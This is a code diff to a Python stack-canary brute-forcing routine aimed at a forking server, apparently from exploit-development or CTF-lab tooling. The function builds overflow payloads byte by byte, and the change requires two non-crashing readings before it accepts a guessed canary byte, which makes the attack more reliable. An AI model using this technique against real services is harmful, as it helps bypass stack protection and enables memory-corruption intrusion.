@@ -54,19 +54,22 @@ def crack_canary(server: ForkingServer, search_max: int = _DEFAULT_SEARCH_MAX) -
 
 
 def _find_byte_at_position(server: ForkingServer, offset: int, canary: bytearray, position: int) -> int:
-    # Retries the *whole* 256-guess sweep, not individual guesses — a
-    # transient miss on the one guess that shouldn't smash (see
-    # _smashes()'s own stale-message-drain comment) makes every guess in
-    # that sweep look like a smash, so "no working byte found" isn't
-    # necessarily a real failure. Confirmed rare-but-real on fast native
-    # hardware even after the drain-before-send fix: one full run got
-    # every byte right except the very last, on a second crack against
-    # the same server. A repeat of the same transient condition landing
-    # on the exact same guess again is unlikely.
+    # A "no smash" reading for a *wrong* guess (a false negative — the
+    # smash message genuinely didn't arrive within _ATTEMPT_RECV_TIMEOUT,
+    # e.g. under real scheduling jitter on shared CI hardware) must not be
+    # accepted on a single reading: confirmed for real that a first
+    # version of this retry (looping the whole sweep again on total
+    # failure) just changed the failure mode from a loud
+    # CanaryNotFoundError to a *silently wrong* accepted byte, since nothing
+    # re-checked whichever guess happened to read as "not smashing" before
+    # trusting it. Requiring two independent "not smashing" readings for
+    # the *same* guess before accepting it squares the odds of a false
+    # accept — a real wrong guess would need to read as "no smash" twice
+    # in a row, not just once.
     for _ in range(_MAX_POSITION_ATTEMPTS):
         for guess in range(256):
             payload = b"A" * offset + bytes(canary) + bytes([guess])
-            if not _smashes(server, payload):
+            if not _smashes(server, payload) and not _smashes(server, payload):
                 return guess
     raise CanaryNotFoundError(
         f"no working byte found at canary position {position} "
